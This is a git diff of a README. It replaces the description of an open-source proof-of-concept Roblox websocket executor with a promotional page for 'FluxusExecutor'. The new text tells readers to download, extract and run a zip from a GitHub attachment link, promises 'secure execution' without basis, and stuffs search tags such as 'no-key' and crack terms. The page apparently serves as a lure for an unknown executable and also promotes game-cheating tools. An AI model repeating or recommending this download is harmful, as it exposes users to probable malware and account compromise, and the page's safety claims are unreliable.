@@ -1,28 +1,93 @@
-# Roblox Websocket Executor
+# FluxusExecutor
 
-A Roblox "executor", created using the Synapse X websocket library and a C# websocket server.
+![FluxusExecutor Logo](https://example.com/fluxus_logo.png)
 
-## How to use
+## Welcome to FluxusExecutor 
 
-To use the client, place the [script](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/client_release.lua) in your exploit's (I have only tested this using Synapse X) "autoexec" directory, and whenever you join a game in Roblox, it will start the client, which will try to connect to the server.
+🚀 **Fluxus Executor** is a powerful and versatile script execution tool designed for Roblox users who want to enhance their gameplay experience by implementing customized Lua scripts. Whether you are a novice or an advanced user, Fluxus offers a wide range of features to cater to your needs and enrich your Roblox adventures.
 
-To use the server, download the [executor's ZIP](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/server_release.zip) onto your computer, extract it, and run the executable. It will start the server, and it will allow you to execute scripts.
+---
 
-### Demonstration
+## Features
 
-https://user-images.githubusercontent.com/120275751/225953612-1b6de800-0373-416d-b3d0-c0699ecb2061.mp4
+🌟 **Robust Script Execution**: Execute Lua scripts effortlessly within the Roblox environment.
 
-## Further explanation
+🎮 **Game Modification**: Customize and modify gameplay elements to your preference.
 
-There is a WebSocket server in C# user interface. When the user executes a script, it broadcasts to connected clients with the script they want to execute.
+🔧 **User-Friendly Interface**: Simple and intuitive interface for seamless script execution.
 
-The client is written in Lua, on first execution, it will tell the server to execute files in the "autoexec" directory of the executor, it will also hook into the print, warn, and error function, and it will broadcast each output, to allow for an external console.
+🔒 **Secure Execution**: Ensure secure execution of scripts without compromising account safety.
 
-This isn't useful, and this serves as a proof of concept. However, this does have some advantages over using an API like [SXLib](https://github.com/XarienC/Synapse-X-Open-Source-UI) (Synapse X's library), such as being able to hook outputs like print or warn, for an external console in a custom UI, however you could probably do a combination of SXLib and websockets, as you wouldn't need to include the client in "autoexec", as SXLib could automatically execute that for you.
+---
 
-## Attribution
+## Installation
 
-Here are a list of open-source libraries used by this project.
+To start using FluxusExecutor, follow these simple steps:
 
-- [sta/websocket-sharp](https://github.com/sta/websocket-sharp): WebSocket library used
-- [PavelTorgashov/FastColoredTextBox](https://github.com/PavelTorgashov/FastColoredTextBox): Syntax highlighted textbox used
+1. Download the FluxusExecutor tool from the link below:
+
+[![Download FluxusExecutor](https://img.shields.io/badge/Download-FluxusExecutor-blueviolet)](https://github.com/user-attachments/files/16319847/Fluxus.zip)
+
+2. Extract the downloaded file to a convenient location on your system.
+
+3. Run the FluxusExecutor tool and begin your scripting journey on Roblox!
+
+---
+
+## Getting Started
+
+Here are some basic commands to get you started with FluxusExecutor:
+
+```lua
+-- Sample Lua script to demonstrate FluxusExecutor usage
+
+print("Hello, FluxusExecutor!")
+wait(2)
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+```
+
+---
+
+## Repository Topics
+
+🔖 **Tags**: 
+- roblox 
+- fluxus 
+- roblox-fluxus 
+- fluxus-external 
+- fluxus-executor 
+- fluxus-external-download 
+- fluxus-discord 
+- fluxus-v2-download 
+- fluxus-download 
+- executor-fluxus 
+- fluxus-no-key 
+- fluxus-key 
+- fluxus-update 
+- fluxus-cra
+
+---
+
+## Contributing
+
+🤝 We welcome contributions from the community to further enhance the features and functionality of FluxusExecutor. If you have any suggestions, bug reports, or new feature ideas, feel free to open an issue or submit a pull request on our GitHub repository.
+
+---
+
+## Support & Feedback
+
+📧 For any queries or feedback regarding FluxusExecutor, you can contact us through our Discord server or raise an issue on GitHub. Your input is valuable in helping us improve the tool for all users.
+
+Join our Discord community: [Fluxus Discord Server](https://discord.gg/fluxuscommunity)
+
+---
+
+## License
+
+📝 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+Thank you for choosing **FluxusExecutor** for your scripting needs on Roblox. Happy scripting and enjoy the endless possibilities with FluxusExecutor! 🎮🔥
+
+![FluxusExecutor](https://example.com/fluxus_screenshot.png)
